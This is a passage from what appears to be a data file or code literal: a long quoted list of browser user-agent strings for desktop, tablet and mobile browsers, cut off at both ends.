(KHTML, like Gecko) GSA/7.0.55539 Mobile/11D201 Safari/9537.53', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.130 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.130 Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.0.1; SCH-I545 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Mobile Safari/537.36', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Mobile Safari/537.36', 'Mozilla/5.0 (iPhone; CPU iPhone OS 8_0 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12A365 Safari/600.1.4', 'Mozilla/5.0 (Windows NT 5.1; rv:34.0) Gecko/20100101 Firefox/34.0', 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0', 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; MDDCJS; rv:11.0) like Gecko', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.132 Safari/537.36', 'Mozilla/5.0 (iPad;U;CPU OS 5_1_1 like Mac OS X; zh-cn)AppleWebKit/534.46.0(KHTML, like Gecko)CriOS/19.0.1084.60 Mobile/9B206 Safari/7534.48.3', 'Mozilla/5.0 (Linux; Android 4.4.3; KFAPWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/44.1.81 like Chrome/44.0.2403.128 Safari/537.36', 'Mozilla/5.0 (iPad; CPU OS 7_1_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) CriOS/45.0.2454.68 Mobile/11D201 Safari/9537.53', 'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36', 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.118 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36', 'Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/43.0.2357.61 Mobile/12H321 Safari/600.1.4', 'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MAMIJS; rv:11.0) like Gecko', 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.0.1; VS985 4G Build/LRX21Y) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Mobile Safari/537.36', 'Mozilla/5.0 (Windows NT 5.1; rv:33.0) Gecko/20100101 Firefox/33.0', 'Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36', 'Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/45.0.2454.68 Mobile/12H143 Safari/600.1.4', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.0; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0', 'Mozilla/5.0 (Linux; Android 5.0.2; LG-V410/V41020b Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/34.0.1847.118 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2503.0 Safari/537.36', 'Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0', 'Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B435 Safari/600.1.4', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36', 'Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101 Firefox/28.0', 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:36.0) Gecko/20100101 Firefox/36.0', 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; InfoPath.3; .NET4.0C; .NET4.0E)', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36', 'Mozilla/5.0 (Windows NT 5.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36', 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36', 'Mozilla/5.0 (Windows NT 5.2; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0', 'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MDDRJS; rv:11.0) like Gecko', 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.6.2000 Chrome/30.0.1599.101 Safari/537.36', 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.3; WOW64; Trident/6.0)', 'Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G920T Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.2 Chrome/38.0.2125.102 Mobile Safari/537.36', 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; MS-RTC LM 8)', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2503.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.91 Safari/537.36', 'Mozilla/5.0 (Linux; Android 4.4.3; KFTHWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/34.0.0.0 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36', 'Mozilla/5.0 (Linux; Android 4.4.3; KFSAWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/44.1.81 like Chrome/44.0.2403.128 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.132 Safari/537.36', 'Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/32.0', 'Mozilla/5.0 (Linux; Android 4.4.2; SM-T230NU Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.133 Safari/537.36', 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36', 'Mozilla/5.0 (Linux; Android 4.2.2; SM-T110 Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.0.1; SAMSUNG SM-N910T Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E)', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36', 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Win64; x64; Trident/7.0)', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:33.0) Gecko/20100101 Firefox/33.0', 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.154 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36', 'Mozilla/5.0 (X11; CrOS armv7l 6946.86.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.94 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0 SeaMonkey/2.35', 'http://www.useragentstring.com/Firefox25.0_id_19710.php', 'Mozilla/5.0 (Linux; Android 4.4.2; SM-T330NU Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36', 'Mozilla/5.0 (iPad; CPU OS 6_0_1 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A8426 Safari/8536.25', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.130 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.0.2; LG-V410 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36 TheWorld 6', 'Mozilla/5.0 (iPad; CPU OS 8_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/7.0.55539 Mobile/12B410 Safari/600.1.4', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.132 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.107 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0 Safari/600.1.25', 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0; EIE10;ENUSWOL)', 'Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/43.0.2357.61 Mobile/12H143 Safari/600.1.4', 'Mozilla/5.0 (iPad; CPU OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/43.0.2357.61 Mobile/12F69 Safari/600.1.4', 'Mozilla/5.0 (Linux; Android 4.4.2; SM-T237P Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36', 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.152 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; ATT; rv:11.0) like Gecko', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.0.2; SM-T800 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.133 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; EIE10;ENUSMSN; rv:11.0) like Gecko', 'Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; MATBJS; rv:11.0) like Gecko', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.107 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; LGMS323 Build/KOT49I.MS32310c) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.1599.103 Mobile Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.101 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; EIE11;ENUSMSN; rv:11.0) like Gecko', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.6.1000 Chrome/30.0.1599.101 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; rv:29.0) Gecko/20100101 Firefox/29.0', 'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.114 Safari/537.36 Puffin/4.5.0IT', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.131 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; yie8; rv:11.0) like Gecko', 'Mozilla/5.0 (Linux; U; Android 4.4.3; en-gb; KFTHWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; FunWebProducts; rv:11.0) like Gecko', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2505.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; MALNJS; rv:11.0) like Gecko', 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; BOIE9;ENUSSEM; rv:11.0) like Gecko', 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Win64; x64; Trident/6.0; Touch; WebView/1.0)', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36', 'Mozilla/5.0 (iPad; CPU OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B176 Safari/7534.48.3', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:33.0) Gecko/20100101 Firefox/33.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.0.1; SAMSUNG SPH-L720 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; yie9; rv:11.0) like Gecko', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFSAWA Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0', 'Mozilla/5.0 (compatible; Windows NT 6.1; Catchpoint) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/29.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0', 'Mozilla/5.0 (Windows NT 6.0; rv:38.0) Gecko/20100101 Firefox/38.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.118 Safari/537.36', 'Mozilla/5.0 (Linux; Android 4.4.4; Z970 Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1.1; Nexus 5 Build/LMY48I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Mobile Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/534.55.3 (KHTML, like Gecko) Version/5.1.3 Safari/534.53.10', 'Mozilla/5.0 (X11; CrOS armv7l 6812.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.153 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36', 'Mozilla/5.0 (iPhone; CPU iPhone OS 6_1_3 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10B329 Safari/8536.25', 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; MAARJS; rv:11.0) like Gecko', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:36.0) Gecko/20100101 Firefox/36.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0', 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; )', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.132 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; MASAJS; rv:11.0) like Gecko', 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; MAARJS; rv:11.0) like Gecko', 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.13+ (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36 SE 2.X MetaSr 1.0', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 BIDUBrowser/7.6 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; MASMJS; rv:11.0) like Gecko', 'Mozilla/5.0 (Windows NT 10.0; Trident/7.0; Touch; rv:11.0) like Gecko', 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E; 360SE)', 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; InfoPath.3; .NET4.0C; .NET4.0E; MS-RTC LM 8)', 'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; MAGWJS; rv:11.0) like Gecko', 'Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G925T Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.2 Chrome/38.0.2125.102 Mobile Safari/537.36', 'Mozilla/5.0 (X11; CrOS x86_64 6457.107.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36', 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; 360SE)', 'Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4.17.9 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3', 'Mozilla/5.0 (Linux; Android 4.2.2; GT-P5113 Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36', 'Mozilla/5.0 (X11; Linux i686; rv:24.0) Gecko/20100101 Firefox/24.0 DejaClick/2.5.0.11', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.154 Safari/537.36 LBBROWSER', 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 Safari/537.36 SE 2.X MetaSr 1.0', 'Mozilla/5.0 (Linux; Android 4.4.3; KFARWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/44.1.81 like Chrome/44.0.2403.128 Safari/537.36', 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.117 Safari/537.36', 'Mozilla/5.0 (iPad; CPU OS 8_1_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/8.0.57838 Mobile/12B466 Safari/600.1.4', 'Mozilla/5.0 (Unknown; Linux i686) AppleWebKit/534.34 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/534.34', 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; NP08; MAAU; NP08; rv:11.0) like Gecko', 'Mozilla/5.0 (Linux; Android 4.4.2; LG-V410 Build/KOT49I.V41010d) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 Safari/537.36 SE 2.X MetaSr 1.0', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3)', 'Mozilla/5.0 (Windows NT 6.1; rv:28.0) Gecko/20100101 Firefox/28.0', 'Mozilla/5.0 (X11; CrOS x86_64 6946.70.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.132 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/6.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; .NET4.0C; .NET4.0E)', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:33.0) Gecko/20100101 Firefox/33.0', 'Mozilla/5.0 (iPod touch; CPU iPhone OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 IceDragon/38.0.5 Firefox/38.0.5', 'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; managedpc; rv:11.0) like Gecko', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.116 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; MASMJS; rv:11.0) like Gecko', 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.111 Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 4.0.3; en-ca; KFOT Build/IML74K) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36', 'Mozilla/5.0 (Linux; Android 4.2.2; Le Pan TC802A Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36', 'Mozilla/5.0 (iPad; CPU OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) GSA/6.0.51363 Mobile/11D257 Safari/9537.53', 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36 LBBROWSER', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:37.0) Gecko/20100101 Firefox/37.0', 'Mozilla/5.0 (Windows NT 6.2; ARM; Trident/7.0; Touch; rv:11.0; WPDesktop; Lumia 1520) like Gecko', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0', 'Mozilla/5.0 (iPhone; CPU iPhone OS 7_0_6 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11B651 Safari/9537.53', 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.2; .NET4.0C; .NET4.0E)', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E; 360SE)', 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.103 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.36 (KHTML, like Gecko) 